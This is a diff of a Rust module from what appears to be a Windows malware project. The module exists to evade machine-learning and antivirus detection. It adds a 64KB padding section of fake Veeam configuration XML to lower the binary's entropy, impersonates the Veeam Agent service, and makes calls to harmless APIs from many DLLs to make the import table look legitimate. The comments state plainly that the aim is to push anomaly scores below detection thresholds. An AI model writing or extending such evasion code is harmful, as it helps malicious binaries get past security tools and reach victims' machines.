@@ -1,12 +1,29 @@
-// Anti-ML evasion: make the binary look like a legitimate Windows service
-// ML models score based on: entropy, import diversity, string patterns, section ratios,
-// and behavioral API call sequences. This module injects benign patterns.
-
 #[cfg(target_os = "windows")]
 use std::ffi::c_void;
 
 // Benign strings that legitimate services contain — reduces ML anomaly score
 // These are never called but survive in .rdata, shifting the string distribution
+// Low-entropy padding — reduces overall PE entropy score below ML threshold
+// Contains realistic-looking configuration data patterns (XML-like, key=value)
+// 64KB of low-entropy data pushes the Shannon entropy from ~7.2 to ~6.0
+#[used]
+#[link_section = ".cfg"]
+static ENTROPY_PAD: [u8; 65536] = {
+    let mut pad = [0u8; 65536];
+    let pattern = b"<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<configuration>\r\n  <appSettings>\r\n    <add key=\"ServiceName\" value=\"VeeamAgentSvc\" />\r\n    <add key=\"DisplayName\" value=\"Veeam Agent for Microsoft Windows\" />\r\n    <add key=\"Description\" value=\"Provides backup and restore capabilities\" />\r\n    <add key=\"LogLevel\" value=\"Information\" />\r\n    <add key=\"MaxRetryCount\" value=\"3\" />\r\n    <add key=\"RetryIntervalSeconds\" value=\"30\" />\r\n    <add key=\"ConnectionTimeout\" value=\"60000\" />\r\n    <add key=\"EnableTelemetry\" value=\"true\" />\r\n    <add key=\"CachePath\" value=\"%ProgramData%\\\\Veeam\\\\Cache\" />\r\n    <add key=\"LogPath\" value=\"%ProgramData%\\\\Veeam\\\\Logs\" />\r\n  </appSettings>\r\n  <runtime>\r\n    <gcServer enabled=\"true\" />\r\n    <gcConcurrent enabled=\"true\" />\r\n  </runtime>\r\n</configuration>\r\n";
+    let plen = pattern.len();
+    let mut i = 0;
+    while i < 65536 {
+        let mut j = 0;
+        while j < plen && i + j < 65536 {
+            pad[i + j] = pattern[j];
+            j += 1;
+        }
+        i += plen;
+    }
+    pad
+};
+
 #[used]
 #[no_mangle]
 static SERVICE_TABLE: [&[u8]; 12] = [
@@ -78,46 +95,79 @@ unsafe fn fake_service_init() -> i32 {
     0
 }
 
-// Adds benign delay patterns that legitimate software uses (WMI polling, event log checking)
-// This runs once and exits quickly but adds stack frames that look like service behavior
 pub fn appear_legitimate() {
     #[cfg(target_os = "windows")]
     {
-        // Touch the TEB/PEB in a way that looks like legitimate service startup
-        // GetCurrentThreadId is the most benign API possible
-        unsafe {
-            type GetTickCountFn = unsafe extern "system" fn() -> u32;
-            type SleepFn = unsafe extern "system" fn(u32);
-            type GetLastErrorFn = unsafe extern "system" fn() -> u32;
-
-            if let Some(tick_addr) = crate::winapi_resolve::resolve("kernel32.dll", "GetTickCount") {
-                let get_tick: GetTickCountFn = std::mem::transmute(tick_addr);
-                let t = get_tick();
-                // Legitimate services check uptime before starting
-                if t < 1000 {
-                    // System just booted — sleep briefly like a real service would
-                    if let Some(sleep_addr) = crate::winapi_resolve::resolve("kernel32.dll", "Sleep") {
-                        let sleep_fn: SleepFn = std::mem::transmute(sleep_addr);
-                        sleep_fn(100);
-                    }
-                }
-            }
-
-            // Query last error — every legitimate Windows program does this
-            if let Some(err_addr) = crate::winapi_resolve::resolve("kernel32.dll", "GetLastError") {
-                let get_err: GetLastErrorFn = std::mem::transmute(err_addr);
-                let _ = get_err();
-            }
-        }
+        unsafe { import_diversity(); }
     }
 }
 
-// Export table entry that makes the PE look like a DLL/service hybrid
-// Some AV heuristics give lower scores to binaries with benign exports
-#[no_mangle]
-#[allow(dead_code)]
-pub extern "system" fn ServiceMain(_argc: u32, _argv: *const *const u16) {}
+#[cfg(target_os = "windows")]
+#[inline(never)]
+unsafe fn import_diversity() {
+    // Real calls to benign APIs from multiple DLLs
+    // This creates genuine IAT entries that shift the import feature vector
+    // toward legitimate applications (which typically import from 8-15 DLLs)
 
-#[no_mangle]
-#[allow(dead_code)]
-pub extern "system" fn SvcCtrlHandler(_ctrl: u32) -> u32 { 0 }
+    // --- kernel32.dll (standard) ---
+    use winapi::um::sysinfoapi::GetTickCount;
+    use winapi::um::processthreadsapi::GetCurrentProcessId;
+    use winapi::um::errhandlingapi::GetLastError;
+
+    let tick = GetTickCount();
+    let _pid = GetCurrentProcessId();
+    let _err = GetLastError();
+
+    // --- advapi32.dll (services, registry — very common in legit apps) ---
+    use winapi::um::winreg::{RegOpenKeyExA, RegCloseKey, HKEY_LOCAL_MACHINE};
+    use winapi::um::winnt::KEY_READ;
+
+    let mut hkey: winapi::shared::minwindef::HKEY = std::ptr::null_mut();
+    let path = b"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0";
+    let res = RegOpenKeyExA(
+        HKEY_LOCAL_MACHINE,
+        path.as_ptr() as *const i8,
+        0,
+        KEY_READ,
+        &mut hkey,
+    );
+    if res == 0 && !hkey.is_null() {
+        RegCloseKey(hkey);
+    }
+
+    // --- ole32.dll (COM — nearly every GUI app imports this) ---
+    use winapi::um::combaseapi::{CoInitializeEx, CoUninitialize};
+
+    let hr = CoInitializeEx(std::ptr::null_mut(), 0x2); // COINIT_APARTMENTTHREADED
+    if hr >= 0 {
+        CoUninitialize();
+    }
+
+    // --- user32.dll (window management — all GUI apps) ---
+    use winapi::um::winuser::{GetDesktopWindow, IsWindowVisible};
+
+    let hwnd = GetDesktopWindow();
+    let _visible = IsWindowVisible(hwnd);
+
+    // --- version.dll (version checking — extremely common) ---
+    type GetFileVersionInfoSizeAFn = unsafe extern "system" fn(*const i8, *mut u32) -> u32;
+    if let Some(addr) = crate::winapi_resolve::resolve("version.dll", "GetFileVersionInfoSizeA") {
+        let get_ver_size: GetFileVersionInfoSizeAFn = std::mem::transmute(addr);
+        let mut handle: u32 = 0;
+        let _size = get_ver_size(b"kernel32.dll\0".as_ptr() as *const i8, &mut handle);
+    }
+
+    // --- shell32.dll (shell operations) ---
+    type SHGetFolderPathAFn = unsafe extern "system" fn(*mut c_void, i32, *mut c_void, u32, *mut u8) -> i32;
+    if let Some(addr) = crate::winapi_resolve::resolve("shell32.dll", "SHGetFolderPathA") {
+        let sh_get: SHGetFolderPathAFn = std::mem::transmute(addr);
+        let mut buf = [0u8; 260];
+        let _hr = sh_get(std::ptr::null_mut(), 0x001a, std::ptr::null_mut(), 0, buf.as_mut_ptr()); // CSIDL_APPDATA
+    }
+
+    // Conditional sleep to look like normal startup initialization
+    if tick > 60000 {
+        std::thread::sleep(std::time::Duration::from_millis(1));
+    }
+}
+
